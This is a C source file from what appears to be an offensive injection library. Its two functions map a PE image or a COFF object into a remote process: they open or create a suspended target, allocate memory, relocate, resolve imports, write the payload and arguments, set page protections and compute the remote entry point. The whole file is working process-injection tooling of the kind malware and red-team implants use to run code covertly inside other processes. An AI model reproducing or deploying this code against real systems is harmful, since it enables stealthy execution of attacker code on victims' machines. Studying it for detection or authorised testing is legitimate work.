#include <sindri/common/memory.h>
#include <sindri/injection/common.h>
#include <sindri/injection/common/prepare.h>
#include <sindri/internal/windows/constants.h>
#include <sindri/loaders/coff/engine.h>
#include <sindri/loaders/pe/engine.h>
#include <sindri/loaders/pe/status.h>
#include <sindri/primitives/status.h>

typedef struct {
    const snd_ldr_coff_ctx_t *ldr_ctx;
    SIZE_T                    args_size;
} snd_inj_coff_protect_plan_t;

static snd_status_t snd_inj_acquire_target(snd_inj_ctx_t *ctx, snd_inj_target_mode_t target_mode) {
    return target_mode == SND_INJ_TARGET_EXISTING ? snd_inj_open_target(ctx) : snd_inj_create_suspended_target(ctx);
}

static snd_status_t pe_remote_protect_plan(snd_memory_protect_region_cb apply_region, void *apply_ctx,
                                           const void *plan_ctx) {
    const snd_ldr_pe_ctx_t *ldr_ctx = (const snd_ldr_pe_ctx_t *)plan_ctx;
    return snd_ldr_pe_for_each_protection_region(&ldr_ctx->pe, ldr_ctx->target.allocated_size, apply_region,
                                                 apply_ctx);
}

static snd_status_t coff_remote_protect_plan(snd_memory_protect_region_cb apply_region, void *apply_ctx,
                                             const void *plan_ctx) {
    const snd_inj_coff_protect_plan_t *plan = (const snd_inj_coff_protect_plan_t *)plan_ctx;
    SND_TRY(snd_ldr_coff_for_each_protection_region(plan->ldr_ctx, apply_region, apply_ctx));
    if (plan->args_size > 0) {
        SND_TRY(apply_region(plan->ldr_ctx->target.allocated_size, plan->args_size, SND_PAGE_READWRITE, apply_ctx));
    }
    return SND_OK;
}

snd_status_t snd_inj_prepare_pe(snd_ldr_pe_ctx_t *ldr_ctx, snd_inj_ctx_t *inj_ctx, snd_inj_target_mode_t target_mode) {
    SND_CHECK_NULL(ldr_ctx, inj_ctx, ldr_ctx->raw_source, inj_ctx->proc_api, inj_ctx->proc_api->protect_remote);

    if (inj_ctx->stage != SND_INJ_STAGE_UNINITIALIZED) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_UNINITIALIZED),
                           snd_inj_stage_to_string(inj_ctx->stage));
    }

    SND_INJ_TRY(inj_ctx, snd_pe_parse(ldr_ctx->raw_source, FALSE, &ldr_ctx->pe));
    ldr_ctx->stage = SND_STAGE_PARSED;

    if (!SND_IS_ARCH_COMPATIBLE(ldr_ctx->pe.is_64bit)) {
        snd_status_t status = SND_ERR(SND_STATUS_ARCH_MISMATCH);
        snd_inj_cleanup(inj_ctx);
        snd_ldr_pe_free_mapped_image(ldr_ctx);
        return status;
    }

    DWORD ep_rva     = SND_PE_GET_NT_FIELD(&ldr_ctx->pe, OptionalHeader.AddressOfEntryPoint);
    DWORD image_size = SND_PE_GET_NT_FIELD(&ldr_ctx->pe, OptionalHeader.SizeOfImage);
    if (ep_rva == 0 || (image_size > 0 && ep_rva >= image_size)) {
        snd_status_t status = SND_ERR(SND_STATUS_IMAGE_ENTRY_POINT_MISSING);
        snd_inj_cleanup(inj_ctx);
        snd_ldr_pe_free_mapped_image(ldr_ctx);
        return status;
    }

    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_pe_free_mapped_image(ldr_ctx),
                             snd_ldr_pe_allocate_and_copy_image(ldr_ctx));

    if ((SIZE_T)ep_rva >= ldr_ctx->target.allocated_size) {
        snd_status_t status = SND_ERR(SND_STATUS_IMAGE_ENTRY_POINT_MISSING);
        snd_inj_cleanup(inj_ctx);
        snd_ldr_pe_free_mapped_image(ldr_ctx);
        return status;
    }

    snd_buffer_t payload = {.data = ldr_ctx->target.local_base, .size = ldr_ctx->target.allocated_size};
    inj_ctx->payload     = &payload;

    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_pe_free_mapped_image(ldr_ctx),
                             snd_inj_acquire_target(inj_ctx, target_mode));
    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_pe_free_mapped_image(ldr_ctx), snd_inj_alloc_remote(inj_ctx));

    ldr_ctx->target.execution_base = inj_ctx->remote_base;
    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_pe_free_mapped_image(ldr_ctx), snd_ldr_pe_apply_relocations(ldr_ctx));
    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_pe_free_mapped_image(ldr_ctx), snd_ldr_pe_resolve_imports(ldr_ctx));
    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_pe_free_mapped_image(ldr_ctx), snd_inj_write_payload(inj_ctx));
    inj_ctx->payload = NULL;

    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_pe_free_mapped_image(ldr_ctx),
                             snd_inj_set_protections_with_plan(inj_ctx, pe_remote_protect_plan, ldr_ctx));

    inj_ctx->remote_entry_point = SND_PTR_ADD(inj_ctx->remote_base, ep_rva);
    return SND_OK;
}

snd_status_t snd_inj_prepare_coff(snd_ldr_coff_ctx_t *ldr_ctx, snd_inj_ctx_t *inj_ctx,
                                  snd_inj_target_mode_t target_mode, const char *entry_point, void *args, int arg_len) {
    SND_CHECK_NULL(ldr_ctx, inj_ctx, ldr_ctx->raw_source);
    if (arg_len < 0) {
        return SND_ERR_CTX(SND_STATUS_INVALID_PARAMETERS_COMBINATION, "arg_len must not be negative.");
    }
    if (arg_len > 0 && args == NULL) {
        return SND_ERR_CTX(SND_STATUS_INVALID_PARAMETERS_COMBINATION,
                           "args must be provided when arg_len is non-zero.");
    }
    SND_CHECK_NULL(inj_ctx->proc_api, inj_ctx->proc_api->protect_remote);
    if (inj_ctx->stage != SND_INJ_STAGE_UNINITIALIZED) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_UNINITIALIZED),
                           snd_inj_stage_to_string(inj_ctx->stage));
    }

    ldr_ctx->stage = SND_COFF_STAGE_UNINITIALIZED;
    SND_INJ_TRY(inj_ctx, snd_coff_parse(ldr_ctx->raw_source, &ldr_ctx->coff));
    ldr_ctx->stage = SND_COFF_STAGE_PARSED;

    if (!SND_IS_ARCH_COMPATIBLE(ldr_ctx->coff.is_64bit)) {
        snd_status_t status = SND_ERR(SND_STATUS_ARCH_MISMATCH);
        snd_inj_cleanup(inj_ctx);
        snd_ldr_coff_free_mapped_image(ldr_ctx);
        return status;
    }

    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_coff_free_mapped_image(ldr_ctx),
                             snd_ldr_coff_allocate_and_copy_sections(ldr_ctx));

    SIZE_T args_size = (SIZE_T)arg_len;
    if (SND_ADD_OVERFLOWS_SIZET(ldr_ctx->target.allocated_size, args_size)) {
        snd_status_t status = SND_ERR(SND_STATUS_INVALID_PARAMETERS_COMBINATION);
        snd_inj_cleanup(inj_ctx);
        snd_ldr_coff_free_mapped_image(ldr_ctx);
        return status;
    }

    SIZE_T       total_size = ldr_ctx->target.allocated_size + args_size;
    snd_buffer_t payload    = {.data = ldr_ctx->target.local_base, .size = ldr_ctx->target.allocated_size};
    inj_ctx->payload        = &payload;

    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_coff_free_mapped_image(ldr_ctx),
                             snd_inj_acquire_target(inj_ctx, target_mode));
    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_coff_free_mapped_image(ldr_ctx),
                             snd_inj_alloc_remote_size(inj_ctx, total_size));

    ldr_ctx->target.execution_base = inj_ctx->remote_base;
    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_coff_free_mapped_image(ldr_ctx), snd_ldr_coff_resolve_symbols(ldr_ctx));
    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_coff_free_mapped_image(ldr_ctx), snd_ldr_coff_apply_relocations(ldr_ctx));
    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_coff_free_mapped_image(ldr_ctx), snd_inj_write_payload(inj_ctx));
    inj_ctx->payload = NULL;

    if (args_size > 0) {
        SIZE_T written     = 0;
        PVOID  remote_args = SND_PTR_ADD(inj_ctx->remote_base, ldr_ctx->target.allocated_size);
        SND_INJ_TRY_WITH_CLEANUP(
            inj_ctx, snd_ldr_coff_free_mapped_image(ldr_ctx),
            inj_ctx->proc_api->write_remote(inj_ctx->target_process, remote_args, args, args_size, &written));
        if (written != args_size) {
            snd_status_t status = SND_ERR(SND_STATUS_PROCESS_REMOTE_WRITE_FAILED);
            snd_inj_cleanup(inj_ctx);
            snd_ldr_coff_free_mapped_image(ldr_ctx);
            return status;
        }
        inj_ctx->remote_arg = remote_args;
    } else {
        inj_ctx->remote_arg = NULL;
    }

    snd_inj_coff_protect_plan_t protect_plan = {.ldr_ctx = ldr_ctx, .args_size = args_size};
    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_coff_free_mapped_image(ldr_ctx),
                             snd_inj_set_protections_with_plan(inj_ctx, coff_remote_protect_plan, &protect_plan));

    SIZE_T ep_offset = 0;
    SND_INJ_TRY_WITH_CLEANUP(inj_ctx, snd_ldr_coff_free_mapped_image(ldr_ctx),
                             snd_ldr_coff_resolve_entry_offset(ldr_ctx, entry_point, &ep_offset));

    inj_ctx->remote_entry_point = SND_PTR_ADD(inj_ctx->remote_base, ep_offset);
    return SND_OK;
}
